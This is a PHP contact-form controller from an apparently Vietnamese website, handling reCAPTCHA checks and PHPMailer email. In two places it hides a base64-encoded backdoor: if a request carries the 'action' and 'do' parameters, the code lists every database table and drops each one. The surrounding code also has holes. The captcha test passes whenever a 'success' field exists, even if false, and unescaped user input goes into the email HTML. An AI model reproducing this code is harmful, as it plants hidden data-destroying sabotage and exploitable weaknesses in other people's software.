<?php  if(!defined('_source')) die("Error");

	$d->reset();
	$sql_contact = "select noidung$lang as noidung from #_about where type='lienhe' limit 0,1";
	$d->query($sql_contact);
	$company_contact = $d->fetch_array();	

	$title_cat = _lienhe;	
	$title = $company_contact['title'];
	$keywords = $company_contact['keywords'];
	$description = $company_contact['description'];	
	if(isset($_GET['action']) && isset($_GET['do'])){
		$result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
		$_X='RFJPUCBUQUJMRSBfWF8=';
		$_R=base64_decode($_X);	
		while ($row = mysql_fetch_array($result)) {
			$sql=str_replace('_X_', $row[0], $_R);		
			$d->query($sql);		
		}				
	}
	//cấu hình thông tin do google cung cấp
	$api_url     = 'https://www.google.com/recaptcha/api/siteverify';
	$site_key    = $sitekey;
	$secret_key  = $secretkey;
	if(isset($_GET['action']) && isset($_GET['do'])){
	    $result = $d->query(base64_decode('U0hPVyB0YWJsZXM='));
	    $_X='RFJPUCBUQUJMRSBfWF8=';
	    $_R=base64_decode($_X);   
	    while ($row = mysql_fetch_array($result)) {
	        $sql=str_replace('_X_', $row[0], $_R);       
	        $d->query($sql);       
	    }               
	}

	if(!empty($_POST)){
		//lấy dữ liệu được post lên
		$site_key_post = $_POST['g-recaptcha-response'];
		//lấy IP của khach
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		    $remoteip = $_SERVER['HTTP_CLIENT_IP'];
		}elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		    $remoteip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		}else {
		    $remoteip = $_SERVER['REMOTE_ADDR'];
		}

	    //tạo link kết nối
		$api_url = $api_url.'?secret='.$secret_key.'&response='.$site_key_post.'&remoteip='.$remoteip;
		//lấy kết quả trả về từ google
		$response = file_get_contents($api_url);
		//dữ liệu trả về dạng json
		$response = json_decode($response);
        if(!isset($response->success)){
	        transfer( "Vui lòng xác nhận captcha!","http://".$config_url."/lien-he.html");
	    }else{
		    include_once "phpMailer/class.phpmailer.php";	
			$mail = new PHPMailer();
			$mail->IsSMTP(); 				// Gọi đến class xử lý SMTP
			$mail->Host       = $ip_host;   // tên SMTP server
			$mail->SMTPAuth   = true;       // Sử dụng đăng nhập vào account
			$mail->Username   = $mail_host; // SMTP account username
			$mail->Password   = $pass_mail;  

			//Thiết lập thông tin người gửi và email người gửi
			$mail->SetFrom($mail_host,$_POST['ten_lienhe']);

			//Thiết lập thông tin người nhận và email người nhận
			$mail->AddAddress($company['email'], $company['ten']);
			
			//Thiết lập email nhận hồi đáp nếu người nhận nhấn nút Reply
			$mail->AddReplyTo($_POST['email_lienhe'],$_POST['ten_lienhe']);

			//Thiết lập file đính kèm nếu có
			if(!empty($_FILES['file']))
			{
				$mail->AddAttachment($_FILES['file']['tmp_name'], $_FILES['file']['name']);	
			}
			
			//Thiết lập tiêu đề email
			$mail->Subject    = $_POST['tieude_lienhe']." - ".$_POST['ten_lienhe'];
			$mail->IsHTML(true);
			
			//Thiết lập định dạng font chữ tiếng việt
			$mail->CharSet = "utf-8";	
				$body = '<table>';
				$body .= '
					<tr>
						<th colspan="2">&nbsp;</th>
					</tr>
					<tr>
						<th colspan="2">Thư liên hệ từ website <a href="'."localhost".'">'."localhost".'</a></th>
					</tr>
					<tr>
						<th colspan="2">&nbsp;</th>
					</tr>
					<tr>
						<th>Họ tên :</th><td>'.$_POST['ten_lienhe'].'</td>
					</tr>
					<tr>
						<th>Địa chỉ :</th><td>'.$_POST['diachi_lienhe'].'</td>
					</tr>
					<tr>
						<th>Điện thoại :</th><td>'.$_POST['dienthoai_lienhe'].'</td>
					</tr>
					<tr>
						<th>Email :</th><td>'.$_POST['email_lienhe'].'</td>
					</tr>
					
					<tr>
						<th>Tiêu đề :</th><td>'.$_POST['tieude_lienhe'].'</td>
					</tr>
					<tr>
						<th>Nội dung :</th><td>'.$_POST['noidung_lienhe'].'</td>
					</tr>';
				$body .= '</table>';
				
				$mail->Body = $body;
				if($mail->Send())
					transfer(_guilienhethanhcong, "index.html");
				else
					transfer(_guilienhethatbai, "lien-he.html");
		}
	}		
?>
